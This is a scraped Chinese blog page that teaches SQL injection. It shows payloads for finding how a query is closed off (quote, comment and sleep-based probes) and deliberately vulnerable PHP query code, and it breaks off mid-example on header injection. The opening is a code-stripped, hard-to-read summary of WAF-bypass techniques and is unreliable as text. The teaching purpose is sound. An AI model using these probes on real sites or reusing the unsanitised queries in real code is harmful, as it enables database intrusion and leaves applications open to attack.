中部署的过滤代码充当了的功能输入的参数经过服务器过滤后再被传入到真正的服务端服务器上处理然后逐层返回到客户端这里传入的参数只有一个名为当我们强行传入两个名都为的参数时获取的是第一个参数而忽略第二个参数则对第二个参数的内容不做任何检查和过滤这样第二个参数就可以传入到服务器端进行解析我们在后面输入进入到受保护的界面预编译绕过简介注入是因为解释器将传入的数据当成命令执行而导致的预编译是用于解决这个问题的一种方法和普通的执行流程不同预编译将一次查询通过两次交互完成第一次交互发送查询语句的模板由后端的引擎进行解析为或第二次交互发送数据代入或中执行因为此时语法解析已经完成所以不会再出现混淆数据和代码的过程模拟预编译为了防止低版本数据库不支持预编译的情况模拟预编译会在客户端内部模拟参数绑定的过程进行自定义的转义绕过预编译使用错误预编译只是使用占位符替代的字段值的部分如果第一次交互传入的命令使用了字符串拼接使得命令是攻击者可控的那么预编译不会生效部分参数不可预编译在有的情况下数据库处理引擎会检查数据表和数据列是否存在因此数据表名和列名不能被占位符所替代这种情况下如果表名和列名可控则可能引入漏洞预编译实现错误部分语言引擎在实现上存在一定问题可能会存在绕过漏洞绕过和的大小写变形将原本的和替换为等等转换编码输入将和使用等编码方式进行转换后在输入添加注释内联注释例如中间的语句会被中解析一般其他数据库不会注释符如下双写绕过例如等可以使用代替代表字符有时候不能用但是可以使用反正就这两个轮换着试验哪个可行用哪个利用符号替换为替换为绕过空格和注释符绕过注释符方法使用或者替换这里理解一下注释符号的作用就可以我们只要把后面的符号想办法闭合就可以单引号可以随时替换主要是根据语句的闭合方式决定使用什么符号闭合绕过空格方法注释绕过键水平新建一行新的一页键键垂直空格绕过主要通过括号去将某些语句独立起来这样就不需要空格了以上都可以用来绕过一般过滤了空格之后联合注入以及双查询注入等就不推荐使用了系统的前提如果是系统直接使用等价字符绕过空格就可以最好使用报错注入中的函数以及函数进行报错注入常见函数比较运算符逻辑运算符数据库版本当前数据库名睡眠时间为指定的秒数判断返回字符串的长度截取字符串三个函数作用相同有三个参数截取的字符串截取起始位置从开始计数截取长度截取字符串三个函数作用相同有三个参数截取的字符串截取起始位置从开始计数截取长度截取字符串三个函数作用相同有三个参数截取的字符串截取起始位置从开始计数截取长度从左侧开始取指定字符个数的字符串没有分隔符的连接字符串含有分割符的连接字符串连接一个组的字符串返回码返回码将字符串转换为十六进制的反向操作返回值返回不大于的最大整数返回参数接近的整数返回之间的随机浮点数读取文件并返回文件内容作为一个字符串返回字符串在字符串列表中的位置指定语句执行的次数返回表作为结果用户名当前用户名系统用户名数据库路径操作系统版本返回当前使用数据库的用户返回当前数据库的版本返回当前使用的数据库多行数据拼接至一行显示根据分组排序把不同列的数据以特定字符隔开在中的注释符注意有时候注释符需要多试几种有的时候不行但是可以排序函数判断列原理后面跟哪个列名就是通过跟哪个列进行排序如果后面跟的是数字那么就代表根据第一列排序代表第二列代表第三列那么一直输入数字的大小就可以判断数据表有多少列了计数函数报错时候可以用到或者布尔注入和延时注入时查询有多少个表多少个列的时候可以用到产生一个随机数返回的随机数是大于等于及小于的均匀分布随机实数报错注入时候有用第一个参数是格式为文档对象的名称文中为第二个参数格式的字符串如果不了解语法可以在网上查找教程第三个参数格式替换查找到的符合条件的数据作用改变文档中符合条件的节点的值对文档进行查询的函数其实就是相当于我们熟悉的文件中用标签查找元素一样语法目标文档路径第二个参数中的位置是可操作的地方文档中查找字符位置是用这种格式如果我们写入其他格式就会报错并且会返回我们写入的非法格式内容而这个非法的内容就是我们想要查询的内容数据库以下没有该表数据库检测字符串连接识别用函数字符串连接字符串连接常量',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-12-19 18:06:17',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">浅析sql注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-08-06T06:55:34.404Z" title="发表于 2023-08-06 14:55:34">2023-08-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-12-19T10:06:17.778Z" title="更新于 2023-12-19 18:06:17">2023-12-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>51分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="浅析sql注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/08/06/qian-xi-sql-zhu-ru/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/08/06/qian-xi-sql-zhu-ru/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/08/06/qian-xi-sql-zhu-ru/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">浅析sql注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-08-06T06:55:34.404Z" title="发表于 2023-08-06 14:55:34">2023-08-06</time><time itemprop="dateCreated datePublished" datetime="2023-12-19T10:06:17.778Z" title="更新于 2023-12-19 18:06:17">2023-12-19</time></header><h1 id="sql注入总结">SQL注入总结</h1>
<p><strong>sql的注入可以分为数字类型，字符类型。</strong></p>
<p><strong>方法1：</strong><br>
<strong>首先我们可以使用(转义字符)来判断SQL注入的闭合方式。</strong><br>
<strong>原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。</strong></p>
<pre><code class="hljs plaintext">分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。</code></pre>
<p><strong>方法2：</strong></p>
<pre><code class="hljs plaintext">首先尝试：
?id=1’
?id=1”
结果一：如果都报错
判断闭合符为：整形闭合。
'1"'
结果二：如果单引号报错，双引号不报错。
继续尝试
?id=1’ –-+
结果1：无报错
判断闭合符为：单引号闭合。
结果2：报错
判断闭合符可能为：单引号加括号。

结果三：如果单引号不报错，双引号报错。
继续尝试
?id=1" -–+
结果1：结果无报错
判断闭合符为：双引号闭合。
结果2：报错
判断闭合符可能为：双引号加括号。

注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判断有多少个括号，可以使用二分法来快速判断。</code></pre>
<pre><code class="hljs plaintext">判断是否存在注入点
通过\ 或者 and1=1 and 1=2  and sleep(3) 查看页面状态  之类的凭感觉是否有注入，有的话判断闭合方式

判断闭合方式
常规闭合' ') ')) " ") "))   
奇葩闭合方式    一个)   和两个 ))

通过and 1=1  和and 1=2 来判断是否执行了我们输入的语句
靶场经验（我会经常通过 ' and sleep(3) --+ 延时判断来闭合，个人习惯，然后一步一步找闭合方式，只要能闭合成功，其它都好说）</code></pre>
<h2 id="0x01-什么是sqli">0x01 什么是SQLI</h2>
<p><strong>所谓SQL注入就是用户在能够控制SQL查询、更新、插入、删除等语句的参数的情况下，攻击者通过构造特殊的输入字符串使后端程序错误地识别SQL查询语句中的代码与数据部分从而导致数据库管理系统输出了非预期的结果的一种行为。</strong></p>
<p><strong>SQL注入本质</strong>上来讲就是拼接字符串，通过输入额外的信息破坏外后端脚本原有的查询语句结构，从而达成注入的目的。</p>
<p>攻击者构造的查询参数在SQL语句中没有被当作一个字符串对待，而是具有了实际的功能特性，这是PHP的语法决定的，它只是简单地将用户的输入与后端预定义的语句做了一个拼接，将拼接的结果整体作为一条SQL的查询语句。正是这个特性导致了SQL注入的产生.</p>
<h2 id="0x02-sql注入的产生">0x02 sql注入的产生</h2>
<h3 id="注-web程序结构">注: web程序结构</h3>
<p><strong>三层架构</strong>(<code>3-tier architecture</code>) 通常意义上就是将整个业务应用划分为：</p>
<ul>
<li>界面层（User Interface layer）</li>
<li>业务逻辑层（Business Logic Layer）</li>
<li>数据访问层（Data access layer）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230605195902135.png" alt="image-20230605195902135"></p>
<p>用户能够直接使用的都是在表示层，在表示层输入自己要访问的内容，输入的内容传递到业务逻辑层进行处理，并将处理后的数据写入到数据库中。</p>
<p>同理需要请求的内容从数据库中查询出来后在业务逻辑层进行业务逻辑处理，之后呈现在表示层。</p>
<p>以上两步就是一个正常的请求和响应过程。</p>
<p>sql注入就是因为业务逻辑层没有做安全过滤，到时了从表示层传递过来的数据修改了正常的sql语句结构，从而达到了黑客自身的攻击目的。</p>
<h3 id="21-字符型注入">2.1 字符型注入</h3>
<p>当我们传入的参数在后端代码中被引号引起来的时候，我们称这种情况为字符型注入</p>
<p>看下面的例子（字符型注入）</p>
<pre><code class="hljs plaintext">$query="select name,age,gender from t_students where id='{$_GET['id']}'";</code></pre>
<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。</p>
<p>注：数据库不同，字符串连接符不同， SQL server的连接符为“+”，Oracle连接符为“||”，MySQL连接符为空格</p>
<h3 id="22-数字型注入">2.2 数字型注入</h3>
<p><strong>我们传入的参数在后端代码中没有被引起来的时候，我们称这种情况为数字型注入。当然之后参数类型为数字的时候，才存在区分数字型和字符型的情况</strong></p>
<pre><code class="hljs plaintext">$query="select name,age,gender from t_students where id={$_GET['id']}";</code></pre>
<p><strong>此时我们传入的参数直接与id进行比较</strong></p>
<p><strong>进行sql注入的首要操作就是对注入类型进行判断，即对sql语句的闭合方式进行判断</strong></p>
<h2 id="0x03-按照请求方法分">0x03 按照请求方法分</h2>
<h3 id="31-get型注入">3.1 GET型注入</h3>
<p><strong>所谓GET型注入，顾名思义，即注入点的参数是同通过GET请求发送到后端进行处理的。其又可以分为下面两种情形：</strong></p>
<h3 id="32-post型注入">3.2 POST型注入</h3>
<p><strong>同理POST是不同于GET的另一种传参方式，大多出现在各种框处，比如登录框，查询框，和各种与数据库有交互的框。post注入和get注入基本没有本质的区别，除了在宽字节注入方面的操作有所区别，基本操作一致。</strong></p>
<h3 id="33-url注入">3.3 url注入</h3>
<p><strong>即注入点在url中。举个例子，现在有一个网页，实现了根据学生学号，来查询学生基本信息的功能，学生的id信息是通过GET方法传参发送到后端的，其请求的url如下</strong></p>
<pre><code class="hljs plaintext">http://www.armandhe.com/query.php?id=20140379</code></pre>
<p><strong>后台处理代码如下</strong></p>
<pre><code class="hljs plaintext">$query="select name,age,gender from t_students where id={$_GET['id']}";</code></pre>
<p><strong>在该例中，我们通过修改url中的id参数的值，来控制前端页面的显示结果。因为没有过滤的原因，我们输入的任何参数值都将被直接拼接到SQL查询语句中，那么我们就可以通过联合查询注入的方式进行注入。</strong></p>
<h3 id="34-请求头注入">3.4 请求头注入</h3>
<p><strong>简单理解就是注入点在请求头中。还是上面的例子，不过url中的参数被后端进行了严格的过滤，不存在任何的注入方法，但后端在进行处理的时候不仅仅是使用了查询语句，还对我们请求头中的user-agent字段在数据库中进行了查询，来防止恶意爬虫，但憨憨程序员却没有对用户的请求头做过滤。于是乎我们可以在请求头中构造恶意代码。同理，不只是user-agent字段，其他字段包括referer等，都可以进行注入，后端处理逻辑如下</strong></p>
<pre><code class="hljs plaintext">$link = @mysqli_connect($host,$username,$password,$dbname,$port);
$userAgent=getallheaders()['User-Agent'];
